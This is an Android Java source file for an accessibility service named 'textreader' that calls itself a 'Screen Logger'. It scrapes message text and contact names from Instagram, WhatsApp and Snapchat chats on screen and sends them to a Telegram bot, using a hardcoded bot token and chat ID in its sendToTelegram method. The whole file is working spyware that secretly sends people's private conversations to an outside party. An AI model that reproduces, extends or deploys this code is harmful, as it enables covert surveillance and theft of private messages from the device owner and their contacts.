package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 YOUR TELEGRAM CREDENTIALS
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
    private static final String CHAT_ID = "5465116744";

    // Cooldown & deduplication
    private long lastSendTime = 0;
    private String lastSentHash = "";

    // Known view IDs for messages (Instagram, WhatsApp, Snapchat)
    private Set<String> messageViewIds = new HashSet<String>() {{
        add("com.instagram.android:id/row_message_text");
        add("com.instagram.android:id/comment_text");
        add("com.instagram.android:id/direct_message_text");
        add("com.instagram.android:id/message_text");
        add("com.whatsapp:id/message_text");
        add("com.snapchat.android:id/chat_message_text");
    }};

    // Known view IDs for sender names
    private Set<String> senderViewIds = new HashSet<String>() {{
        add("com.instagram.android:id/row_user_name");
        add("com.instagram.android:id/comment_user_name");
        add("com.instagram.android:id/username_text_view");
        add("com.instagram.android:id/direct_message_recipient_name");
        add("com.whatsapp:id/contact_name");
        add("com.snapchat.android:id/chat_name");
    }};

    // Blacklist – add any junk you see to this set
    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
        add("Search"); add("Type a message"); add("New message"); add("Seen");
        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
        add("Story"); add("Home"); add("Explore"); add("Activity");
        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
        add("View"); add("Reply"); add("Forward"); add("Delete");
        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
        add("Active now"); add("Typing..."); add("Today"); add("Yesterday");
        add("Seen by"); add("Delivered to"); add("Read by");
        add("Message"); add("Chat"); add("Group"); add("Broadcast");
        add("View Profile"); add("View Story"); add("Reply to");
        add("Manage"); add("Clear all"); add("Location off");
        add("Self Aware"); add("Inspo needed...");
        add("GB"); add("MB"); add("used"); add("airtel"); add("Screenlogger");
        add("Telegram"); add("Search or ask Meta AI");
        add("The Wild Theme"); add("Janam Janam"); add("Sai Abhyankkar");
        add("Dhanush"); add("Pritam"); add("Arijit Singh"); add("Antara Mitra");
        add("Aber sie"); add("Requests"); add("BHAI LOG 💓🫂");
        add("Bakchodi boiz"); add("MARK AS READ");
        add("Display brightness");
    }};

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sendToTelegram("✅ Screen Logger service started successfully!");
        writeToFile("Service started at " + dateFormat.format(new Date()));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // Only process events from target apps
        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        // Only on window or content change (new message or scroll)
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        // 1. Get contact name
        String contactName = findContactName(root);

        // 2. Extract message texts from known view IDs
        List<String> rawMessages = extractMessageTexts(root);

        // 3. Clean and deduplicate
        Set<String> uniqueMessages = new HashSet<>();
        for (String msg : rawMessages) {
            String cleaned = cleanMessage(msg);
            if (!cleaned.isEmpty()) uniqueMessages.add(cleaned);
        }

        if (uniqueMessages.isEmpty()) return;

        // 4. Build structured output
        StringBuilder logBuilder = new StringBuilder();
        logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
        if (contactName != null && !contactName.isEmpty()) {
            logBuilder.append("👤 Chat with: ").append(contactName).append("\n");
        }
        logBuilder.append("─────────────────────\n");
        for (String msg : uniqueMessages) {
            // If message contains ":", try to split sender:message
            if (msg.contains(":")) {
                String[] parts = msg.split(":", 2);
                if (parts.length == 2 && parts[0].trim().length() < 30) {
                    logBuilder.append("  ").append(parts[0].trim()).append(": ").append(parts[1].trim()).append("\n");
                    continue;
                }
            }
            logBuilder.append("  Message: ").append(msg).append("\n");
        }

        String fullLog = logBuilder.toString().trim();
        if (fullLog.length() < 30) return; // ignore if not enough content

        // 5. Deduplication & cooldown
        String hash = Integer.toHexString(fullLog.hashCode());
        long now = System.currentTimeMillis();
        if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
            return;
        }
        lastSentHash = hash;
        lastSendTime = now;

        // 6. Send to Telegram
        sendToTelegram(fullLog);
        writeToFile(fullLog);
    }

    // ---- Helper methods ----

    private String findContactName(AccessibilityNodeInfo root) {
        for (String id : senderViewIds) {
            String name = findTextByViewId(root, id);
            if (name != null && !name.isEmpty()) return name;
        }
        return null;
    }

    private String findTextByViewId(AccessibilityNodeInfo node, String targetId) {
        if (node == null) return null;
        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
            if (node.getText() != null) {
                String text = node.getText().toString().trim();
                if (!text.isEmpty()) return text;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                String result = findTextByViewId(child, targetId);
                if (result != null) return result;
            }
        }
        return null;
    }

    private List<String> extractMessageTexts(AccessibilityNodeInfo root) {
        List<String> messages = new ArrayList<>();
        for (String id : messageViewIds) {
            List<String> found = findAllTextByViewId(root, id);
            messages.addAll(found);
        }
        return messages;
    }

    private List<String> findAllTextByViewId(AccessibilityNodeInfo node, String targetId) {
        List<String> results = new ArrayList<>();
        if (node == null) return results;
        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
            if (node.getText() != null) {
                String text = node.getText().toString().trim();
                if (!text.isEmpty()) results.add(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                results.addAll(findAllTextByViewId(child, targetId));
            }
        }
        return results;
    }

    private String cleanMessage(String msg) {
        msg = msg.trim();
        // Remove if contains junk
        for (String junk : uiJunk) {
            if (msg.toLowerCase().contains(junk.toLowerCase())) return "";
        }
        // Remove timestamps
        if (msg.matches(".*\\d{1,2}:\\d{2}.*")) return "";
        if (msg.matches(".*(AM|PM).*")) return "";
        if (msg.matches(".*\\d+[mh] .*")) return "";
        // Must contain at least one alphabetic character
        if (!msg.matches(".*[a-zA-Z].*")) return "";
        // Too short
        if (msg.length() < 3) return "";
        // All caps and short
        if (msg.equals(msg.toUpperCase()) && msg.length() < 8) return "";
        return msg;
    }

    private String getAppName(String pkg) {
        if (pkg.equals("com.instagram.android")) return "INSTAGRAM";
        if (pkg.equals("com.snapchat.android")) return "SNAPCHAT";
        if (pkg.equals("com.whatsapp")) return "WHATSAPP";
        return pkg;
    }

    // ---- Telegram & File logging ----

    private void sendToTelegram(final String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(message, "UTF-8");
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                writeToFile("Telegram error: " + e.toString());
            }
        }).start();
    }

    private void writeToFile(String text) {
        try {
            File logFile = new File(getFilesDir(), "debug_log.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(text + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) { /* ignore */ }
    }

    @Override
    public void onInterrupt() {}
}
